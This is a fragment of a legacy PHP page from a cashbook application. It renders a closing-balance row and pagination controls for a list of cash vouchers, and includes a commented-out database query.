						<tr bgcolor="#FFDDEE"><?php 
						if((!isset($_REQUEST['pg']) && $total_page>1) || (isset($_REQUEST['pg']) && $total_page>$_REQUEST['pg'])){
							echo '<td colspan="4" align="Right"><b>Balance C/F</b>&nbsp;:&nbsp;</td>';
						} else {
							echo '<td colspan="4" align="Right"><b>Closing Balance</b>&nbsp;:&nbsp;</td>';
						}
						if($clBal<0){
							echo '<td>&nbsp;</td>';
							echo '<td align="Right"><b>'.number_format(-1*$clBal,2,".","").'</b></td>';
						} else {
							echo '<td align="Right"><b>'.number_format($clBal,2,".","").'</b></td>';
							echo '<td>&nbsp;</td>';
						}?>
							<td>&nbsp;</td>
							<td>&nbsp;</td>
						</tr>
						</table>
					</td>
				</tr>
				</table>
			</td>
		</tr>
		<tr>
			<td>
			<?php 
//			$sql_total = mysql_db_query(DATABASE2,"SELECT tblcash1.*,tblcash2.* FROM tblcash1 INNER JOIN tblcash2 ON tblcash1.vouch_id = tblcash2.vouch_id WHERE vouch_date BETWEEN '".date("Y-m-d",$dt1)."' AND '".date("Y-m-d",$dt2)."' AND location_id=".$lid." AND exps_id=".$eid) or die(mysql_error());
//			$tot_row=mysql_num_rows($sql_total);
//			$total_page=0;
			echo 'Total <span style="color:red">'.$tot_row.'</span> records&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;';
			echo '<input type="button" name="show" id="show" value="Show:" onclick="paging_list()" />&nbsp;&nbsp;<input name="displayTotalRows" id="displayTotalRows" value="'.$end.'" maxlength="2" size="2" /> rows&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;';
			if($tot_row>$end){
				echo "Page number: ";
//				$total_page=ceil($tot_row/$end);
				echo '<select name="page" id="page" onchange="paging_list()" style="vertical-align:middle">';
				for($i=1;$i<=$total_page;$i++){
					if(isset($_REQUEST["pg"]) && $_REQUEST["pg"]==$i)
						echo '<option selected value="'.$i.'">'.$i.'</option>';
					else
						echo '<option value="'.$i.'">'.$i.'</option>';
				}
				echo '</select>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;';
			} else {
				echo '<input type="hidden" name="page" id="page" value="1" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;';
			}
			
			echo '<input type="hidden" name="totalPage" id="totalPage" value="'.$total_page.'" />';
			if($total_page>1 && $_REQUEST["pg"]>1)
				echo '<input type="button" name="fistPage" id="firstPage" value=" << " onclick="firstpage_list()" />&nbsp;&nbsp;<input type="button" name="prevPage" id="prevPage" value=" < " onclick="previouspage_list()" />&nbsp;&nbsp;';
			if($total_page>1 && $_REQUEST["pg"]<$total_page)
				echo '<input type="button" name="nextPage" id="nextPage" value=" > " onclick="nextpage_list()" />&nbsp;&nbsp;<input type="button" name="lastPage" id="lastPage" value=" >> " onclick="lastpage_list()" />';
			echo '&nbsp;&nbsp;<input type="button" value="Exit" style="width:80px;" onclick="window.location=\'CashbookMenu.php\'">';
			?>
			</td>
		</tr>
		</table>
	</td>
</tr>
</table>
</form>
</body>
</html>